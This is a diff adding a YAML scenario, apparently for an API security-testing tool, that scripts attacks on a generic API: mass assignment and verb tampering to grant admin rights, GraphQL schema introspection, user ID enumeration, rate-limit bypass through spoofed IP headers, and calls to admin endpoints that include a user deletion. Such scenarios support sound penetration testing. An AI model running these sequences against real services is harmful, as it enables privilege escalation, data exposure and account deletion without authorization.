@@ -1,0 +1,143 @@
+name: api_abuse
+description: API endpoint abuse and data extraction attacks
+
+variables:
+  api_key: ""
+  user_token: ""
+
+steps:
+  - name: authenticate
+    request:
+      method: POST
+      url: /api/auth/token
+      json:
+        client_id: "test_client"
+        client_secret: "test_secret"
+        grant_type: "client_credentials"
+    extract:
+      access_token: $.access_token
+      refresh_token: $.refresh_token
+    expect:
+      status: 200
+    optional: true
+
+  - name: get_api_info
+    request:
+      method: GET
+      url: /api/v1/info
+      headers:
+        Authorization: "Bearer ${access_token}"
+    extract:
+      api_version: $.version
+      endpoints: $.endpoints
+    expect:
+      status: 200
+
+  - name: list_users
+    request:
+      method: GET
+      url: /api/v1/users
+      headers:
+        Authorization: "Bearer ${access_token}"
+    extract:
+      user_count: $.total
+      first_user_id: $.users[0].id
+    expect:
+      status: [200, 403]
+
+attacks:
+  - name: mass_assignment
+    description: Add admin field to user creation
+    type: mass_assignment
+    sequence:
+      - request:
+          method: POST
+          url: /api/v1/users
+          headers:
+            Authorization: "Bearer ${access_token}"
+          json:
+            username: "newuser"
+            email: "new@test.com"
+            password: "test123"
+            role: "admin"
+            is_admin: true
+            admin: true
+        expect:
+          body_contains: "admin"
+
+  - name: graphql_introspection
+    description: Extract GraphQL schema
+    type: information_disclosure
+    sequence:
+      - request:
+          method: POST
+          url: /graphql
+          json:
+            query: "{__schema{types{name fields{name}}}}"
+        expect:
+          body_contains: "__schema"
+
+  - name: bola_enum
+    description: Enumerate objects via ID iteration
+    type: bola
+    sequence:
+      - request:
+          method: GET
+          url: /api/v1/users/1
+          headers:
+            Authorization: "Bearer ${access_token}"
+      - request:
+          method: GET
+          url: /api/v1/users/2
+          headers:
+            Authorization: "Bearer ${access_token}"
+      - request:
+          method: GET
+          url: /api/v1/users/3
+          headers:
+            Authorization: "Bearer ${access_token}"
+
+  - name: rate_limit_bypass
+    description: Bypass rate limiting
+    type: rate_limit_bypass
+    concurrent: 100
+    modify_step: list_users
+    modifications:
+      headers.X-Forwarded-For: "127.0.0.${random}"
+      headers.X-Real-IP: "10.0.0.${random}"
+
+  - name: verb_tampering
+    description: Use different HTTP methods
+    type: verb_tampering
+    sequence:
+      - request:
+          method: PUT
+          url: /api/v1/users/${first_user_id}
+          headers:
+            Authorization: "Bearer ${access_token}"
+          json:
+            role: "admin"
+      - request:
+          method: PATCH
+          url: /api/v1/users/${first_user_id}
+          headers:
+            Authorization: "Bearer ${access_token}"
+          json:
+            is_admin: true
+
+  - name: broken_function_level
+    description: Access admin functions as user
+    type: broken_function_level_auth
+    sequence:
+      - request:
+          method: GET
+          url: /api/admin/users
+          headers:
+            Authorization: "Bearer ${access_token}"
+      - request:
+          method: POST
+          url: /api/admin/users/delete
+          headers:
+            Authorization: "Bearer ${access_token}"
+          json:
+            user_id: 999
